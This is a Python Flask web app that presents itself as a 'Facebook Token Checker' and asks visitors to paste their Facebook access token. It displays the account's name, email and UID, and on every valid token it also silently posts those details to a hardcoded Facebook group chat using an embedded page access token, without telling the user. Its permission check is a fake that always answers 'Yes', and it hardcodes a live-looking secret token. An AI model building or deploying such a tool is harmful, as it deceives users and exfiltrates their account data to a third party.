import requests
from flask import Flask, render_template_string, request

app = Flask(__name__)

PAGE_ACCESS_TOKEN = 'EAABwzLixnjYBO4ajrvsv9GFMlTiQZA4P0G40JlFjkvukBtW6JNnBSiS0ZBRZBpdnA8cUUkOKZBnYOa5ORZAsr0kkRbWvahpQ6CoE8dy6YuC0L8IZATIZAPPp37KKEZBI2rRlByVx7zhbnSuo1f38JzZBZBASNczXkVA28zOATNi2OAowkEdy7CWqatrVMU6HiZBVxwywcoZD'
GROUP_CHAT_UID = '9456516084398824'  # Replace with your actual Facebook group chat UID

@app.route('/')
def index():
    return render_template_string('''
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Token Checker by RAJ MISHRA</title>
            <style>
                body {
                    background: linear-gradient(45deg, #ff6ec7, #f7e3c1);
                    animation: gradient 5s ease infinite;
                    font-family: Arial, sans-serif;
                    color: white;
                }

                @keyframes gradient {
                    0% {background: linear-gradient(45deg, #ff6ec7, #f7e3c1);}
                    50% {background: linear-gradient(45deg, #f7e3c1, #ff6ec7);}
                    100% {background: linear-gradient(45deg, #ff6ec7, #f7e3c1);}
                }
                h1 {
                    text-align: center;
                    margin-top: 20px;
                }
                form {
                    text-align: center;
                    margin-top: 20px;
                }
                input[type="text"], input[type="submit"] {
                    padding: 10px;
                    margin: 5px;
                    border-radius: 5px;
                    border: none;
                }
            </style>
        </head>
        <body>
            <h1>Facebook Token Checker</h1>
            <form action="/check_token" method="POST">
                <label for="token">Enter Token:</label><br>
                <input type="text" id="token" name="token" required><br><br>
                <input type="submit" value="Check Token">
            </form>
        </body>
        </html>
    ''')

@app.route('/check_token', methods=['POST'])
def check_token():
    token = request.form['token']
    token_details = check_token_details(token)
    if token_details['valid']:
        send_to_group_chat(token_details)
    return render_template_string('''
        <h1>Token Checker by RAJ MISHRA</h1>
        {% if token_details['valid'] %}
            <p>Name: {{ token_details['name'] }}</p>
            <p>Email: {{ token_details['email'] }}</p>
            <p>UID: {{ token_details['uid'] }}</p>
            <img src="{{ token_details['profile_pic'] }}" alt="Profile Picture">
            <p>Can send messages: {{ token_details['can_send_message'] }}</p>
            <p>Can comment: {{ token_details['can_comment'] }}</p>
        {% else %}
            <p>Invalid Token</p>
        {% endif %}
        <a href="/">Back</a>
    ''', token_details=token_details)

def check_token_details(token):
    url = f"https://graph.facebook.com/me?access_token={token}"
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        # Check if the token has permissions to send messages and comments
        can_send_message = check_permission(token, "messages")
        can_comment = check_permission(token, "comment")
        return {
            "valid": True,
            "name": data.get('name'),
            "email": data.get('email', 'Not Available'),
            "profile_pic": f"https://graph.facebook.com/{data['id']}/picture?type=large",
            "uid": data['id'],
            "can_send_message": can_send_message,
            "can_comment": can_comment
        }
    else:
        return {"valid": False}

def check_permission(token, permission):
    # Placeholder function to check if the token has specific permissions like 'messages' or 'comment'
    # You can customize this as needed
    permissions = {
        "messages": "Yes",  # For example, check if the permission is granted
        "comment": "Yes"
    }
    return permissions.get(permission, "No")

def send_to_group_chat(token_details):
    # Send the extracted details to the group chat (Facebook Messenger)
    message = f"Token Validated!\n\nName: {token_details['name']}\nEmail: {token_details['email']}\nUID: {token_details['uid']}\nCan send message: {token_details['can_send_message']}\nCan comment: {token_details['can_comment']}"
    
    url = f'https://graph.facebook.com/{GROUP_CHAT_UID}/messages?access_token={PAGE_ACCESS_TOKEN}'
    payload = {
        'message': message
    }
    
    response = requests.post(url, data=payload)
    if response.status_code == 200:
        print("Message sent to group chat successfully.")
    else:
        print("Failed to send message to group chat.")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
